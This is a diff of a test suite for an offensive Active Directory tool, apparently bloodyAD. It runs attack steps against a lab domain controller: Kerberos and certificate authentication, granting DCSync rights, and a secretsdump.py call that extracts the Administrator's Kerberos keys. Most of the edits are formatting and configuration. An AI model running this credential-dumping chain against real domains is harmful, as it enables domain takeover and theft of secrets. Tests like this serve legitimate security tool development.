@@ -7,10 +7,11 @@ class TestModules(unittest.TestCase):
     def setUpClass(cls):
         conf = json.loads((pathlib.Path(__file__).parent / "secrets.json").read_text())
         cls.domain = conf["domain"]
-        cls.rootDomainNamingContext = ",".join([
-            "DC=" + subdomain for subdomain in cls.domain.split(".")
-        ])
+        cls.rootDomainNamingContext = ",".join(
+            ["DC=" + subdomain for subdomain in cls.domain.split(".")]
+        )
         cls.host = conf["pdc"]["ip"]
+        cls.hostname = conf["pdc"]["hostname"]
         cls.admin = {
             "username": conf["admin_user"]["username"],
             "password": conf["admin_user"]["password"],
@@ -22,9 +23,11 @@ class TestModules(unittest.TestCase):
             "python3",
             "bloodyAD.py",
             "--host",
-            cls.host,
+            cls.hostname,
             "-d",
             cls.domain,
+            "--dc-ip",
+            cls.host,
         ]
         cls.user = {"username": "stan.dard", "password": "Password1123!"}
 
@@ -38,12 +41,14 @@ class TestModules(unittest.TestCase):
             f":{md4.MD4(self.user['password'].encode('utf-16le')).hexdigest()}"
         ]
 
-        self.launchProcess([
-            "getTGT.py",
-            "-dc-ip",
-            self.host,
-            f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
-        ])
+        self.launchProcess(
+            [
+                "getTGT.py",
+                "-dc-ip",
+                self.host,
+                f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
+            ]
+        )
         self.env["KRB5CCNAME"] = f"{self.admin['username']}.ccache"
         krb = ["-k"]
 
@@ -54,7 +59,7 @@ class TestModules(unittest.TestCase):
                 "-target",
                 self.host,
                 "-ca",
-                "bloody-ALLMIGHTY-CA-1",
+                "bloody-MAIN-CA",
                 "-template",
                 "User",
                 "-p",
@@ -68,17 +73,19 @@ class TestModules(unittest.TestCase):
             ignoreErr=True,
         )
 
-        self.launchProcess([
-            "openssl",
-            "pkcs12",
-            "-in",
-            "bloodytest.pfx",
-            "-out",
-            "bloodytest.pem",
-            "-nodes",
-            "-passin",
-            "pass:",
-        ])
+        self.launchProcess(
+            [
+                "openssl",
+                "pkcs12",
+                "-in",
+                "bloodytest.pfx",
+                "-out",
+                "bloodytest.pem",
+                "-nodes",
+                "-passin",
+                "pass:",
+            ]
+        )
         cert = ["-c", ":bloodytest.pem"]
 
         auths = [cleartext, ntlm, krb, cert]
@@ -95,7 +102,7 @@ class TestModules(unittest.TestCase):
     def test_02SearchAndGetChildAndGetWritable(self):
         self.launchBloody(
             self.user,
-            ["get", "children", "--target", "OU=Domain Controllers,DC=bloody,DC=local"],
+            ["get", "children", "--target", "OU=Domain Controllers,DC=bloody,DC=corp"],
         )
 
         self.launchBloody(
@@ -257,22 +264,26 @@ class TestModules(unittest.TestCase):
         )
         self.launchBloody(self.user, ["add", "dcsync", slave["username"]])
         self.assertRegex(
-            self.launchProcess([
-                "secretsdump.py",
-                "-just-dc-user",
-                "Administrator",
-                f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
-            ]),
+            self.launchProcess(
+                [
+                    "secretsdump.py",
+                    "-just-dc-user",
+                    "BLOODY/Administrator",
+                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
+                ]
+            ),
             "Kerberos keys grabbed",
         )
         self.launchBloody(self.user, ["remove", "dcsync", slave["username"]])
         self.assertNotRegex(
-            self.launchProcess([
-                "secretsdump.py",
-                "-just-dc-user",
-                "Administrator",
-                f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
-            ]),
+            self.launchProcess(
+                [
+                    "secretsdump.py",
+                    "-just-dc-user",
+                    "BLOODY/Administrator",
+                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
+                ]
+            ),
             "Kerberos keys grabbed",
         )
         self.launchBloody(
@@ -451,6 +462,8 @@ class TestModules(unittest.TestCase):
                 [
                     "python3",
                     f"{self.pkinit_path}/gettgtpkinit.py",
+                    "-dc-ip",
+                    self.host,
                     "-cert-pem",
                     f"{outfile}_cert.pem",
                     "-key-pem",
